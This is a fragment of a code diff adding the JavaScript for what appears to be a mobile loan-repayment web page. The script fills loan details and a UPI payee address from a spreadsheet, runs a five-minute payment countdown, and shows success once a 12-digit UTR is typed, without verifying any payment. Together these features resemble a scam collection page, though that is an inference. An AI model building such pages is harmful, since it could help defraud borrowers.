+                document.getElementById('pending-status-badge').classList.add('overdue');
+            }
+
+            // Order Details Screen
+            document.getElementById('detail-repayment-amount').textContent = totalRepayment;
+            document.getElementById('detail-due-date').textContent = dueDate;
+            document.getElementById('detail-loan-amount').textContent = loanAmount;
+            document.getElementById('detail-late-fee').textContent = lateFee;
+            document.getElementById('detail-tenure').textContent = tenure;
+            document.getElementById('detail-app-date').textContent = applicationDate;
+            document.getElementById('detail-name').textContent = name;
+            
+            if (isOverdue) {
+                document.getElementById('detail-overdue-days').textContent = daysOverdue + ' days';
+                document.getElementById('detail-overdue-row').style.display = 'flex';
+            }
+            
+            // 🔥 Payment Screen - USING VPA/UPI FROM COLUMN Q
+            document.getElementById('amount').value = totalRepayment;
+            document.getElementById('upi').value = vpaUpi || 'merchant@upi';  // 🔥 Using VPA/UPI column with fallback
+            
+            console.log('✅ ALL DATA POPULATED FROM GOOGLE SHEET!');
+            console.log('💳 VPA/UPI set to:', vpaUpi);
+        }
+
+        function showScreen(screenId) {
+            document.querySelectorAll('.screen').forEach(screen => {
+                screen.classList.remove('active');
+            });
+            document.getElementById('screen-loading').classList.add('active');
+            setTimeout(() => {
+                document.getElementById('screen-loading').classList.remove('active');
+                document.getElementById(screenId).classList.add('active');
+                window.scrollTo(0, 0);
+                if (screenId === 'screen-payment') startCountdown();
+            }, 500);
+        }
+
+        function showScreenWithNav(screenId) {
+            showScreen(screenId);
+            document.getElementById('bottom-nav').classList.add('active');
+        }
+
+        function showDetailsScreen() {
+            showScreen('screen-details');
+        }
+
+        function goBack() {
+            showScreenWithNav('screen-pending');
+        }
+
+        function goBackFromHome() {
+            return;
+        }
+
+        function goBackFromPending() {
+            navigateToTab('home');
+        }
+
+        function goBackFromPayment() {
+            showScreen('screen-details');
+        }
+
+        function navigateToTab(tab) {
+            document.querySelectorAll('.nav-btn').forEach(btn => {
+                btn.classList.remove('active-tab');
+            });
+            
+            if (tab === 'home') {
+                document.getElementById('nav-home').classList.add('active-tab');
+                showScreenWithNav('screen-home');
+            } else if (tab === 'pending') {
+                document.getElementById('nav-pending').classList.add('active-tab');
+                showScreenWithNav('screen-pending');
+            } else if (tab === 'repay') {
+                document.getElementById('nav-payment').classList.add('active-tab');
+                showScreenWithNav('screen-pending');
+            } else if (tab === 'payment') {
+                document.getElementById('nav-payment').classList.add('active-tab');
+                showScreenWithNav('screen-payment');
+            }
+        }
+
+        function copyText(elementId) {
+            const element = document.getElementById(elementId);
+            element.select();
+            navigator.clipboard.writeText(element.value).then(() => {
+                alert('Copied: ' + element.value);
+            });
+        }
+
+        function startCountdown() {
+            let timeLeft = 300;
+            if (countdownInterval) clearInterval(countdownInterval);
+            countdownInterval = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                document.getElementById('countdown').textContent = 
+                    `${minutes}:${seconds.toString().padStart(2, '0')}`;
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    alert('Time expired!');
+                }
+                timeLeft--;
+            }, 1000);
+        }
+
+        function submitUTR() {
+            const utr = document.getElementById('utr').value;
+            const errorDiv = document.getElementById('utr-error');
+            
+            if (utr.length !== 12 || !/^\d{12}$/.test(utr)) {
+                errorDiv.textContent = '❌ UTR must be exactly 12 digits';
+                errorDiv.style.display = 'block';
+                return;
+            }
+            
+            errorDiv.style.display = 'none';
+            if (countdownInterval) clearInterval(countdownInterval);
+            document.getElementById('bottom-nav').classList.remove('active');
+            showScreen('screen-success');
+        }
+    </script>
+</body>
+</html>
